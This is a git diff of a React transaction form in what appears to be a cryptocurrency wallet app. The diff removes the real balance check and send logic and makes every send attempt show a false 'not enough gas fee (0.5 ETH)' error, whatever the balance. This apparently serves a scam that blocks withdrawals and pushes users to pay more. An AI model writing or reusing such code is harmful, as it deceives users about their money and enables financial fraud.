@@ -35,7 +35,7 @@ const getWalletAddress = (coinName, network) => {
     : "No Address Available";
 };
 
-const TransactionForm = ({ userBalances = {}, addTransaction }) => {
+const TransactionForm = () => {
   const navigate = useNavigate();
   const location = useLocation();
 
@@ -43,7 +43,7 @@ const TransactionForm = ({ userBalances = {}, addTransaction }) => {
   const [address, setAddress] = useState("");
   const [network, setNetwork] = useState("");
   const [error, setError] = useState("");
-  const [gasFee, setGasFee] = useState(0.5); // Fixed ETH gas fee
+  const [gasFee] = useState(0.5); // Fixed ETH gas fee
   const [isReceiving, setIsReceiving] = useState(false);
   const [walletAddress, setWalletAddress] = useState("");
   const [receiveNetwork, setReceiveNetwork] = useState("");
@@ -68,7 +68,7 @@ const TransactionForm = ({ userBalances = {}, addTransaction }) => {
 
   const handleBack = () => navigate(-1);
 
-  const handleSend = async () => {
+  const handleSend = () => {
     if (!amount || parseFloat(amount) <= 0) {
       setError("Invalid amount. Please enter a valid number.");
       return;
@@ -79,44 +79,9 @@ const TransactionForm = ({ userBalances = {}, addTransaction }) => {
       return;
     }
 
-    try {
-      // Fetch the user's balance for the selected coin from the database
-      const response = await fetch(`/api/user-balance?coin=${coinName}`);
-      const { balance } = await response.json();
-
-      if (!response.ok) {
-        setError("Failed to fetch balance. Please try again later.");
-        return;
-      }
-
-      if (balance < parseFloat(amount)) {
-        setError(
-          `Insufficient balance for ${coinName}. Gas fee of 0.5 ETH is required. Please contact support.`
-        );
-        return;
-      }
-
-      if (balance < parseFloat(amount) + gasFee) {
-        setError(
-          `Your balance is insufficient to cover the transaction and the gas fee of 0.5 ETH.`
-        );
-        return;
-      }
-
-      // Deduct gas fee and add transaction
-      addTransaction({
-        type: "Send",
-        coin: coinName,
-        amount: parseFloat(amount),
-        address,
-        network,
-      });
-
-      alert(`Transaction successful: ${amount} ${coinName} sent to ${address}`);
-      navigate(-1);
-    } catch (error) {
-      setError("An error occurred while processing the transaction.");
-    }
+    setError(
+      `You do not have enough gas fee (0.5 ETH) to complete this transaction. Please ensure you have sufficient funds.`
+    );
   };
 
   const handleReceive = () => setIsReceiving(!isReceiving);
@@ -175,6 +140,9 @@ const TransactionForm = ({ userBalances = {}, addTransaction }) => {
             onChange={(e) => setAddress(e.target.value)}
             className="mt-2 p-2 border rounded-lg w-full bg-stone-900 text-gray-200 border-stone-600"
           />
+          <p className="text-gray-400 text-sm mt-1">
+            Please ensure the address is correct to avoid loss of funds.
+          </p>
         </div>
         <div className="mb-4">
           <label htmlFor="network" className="block text-gray-200">
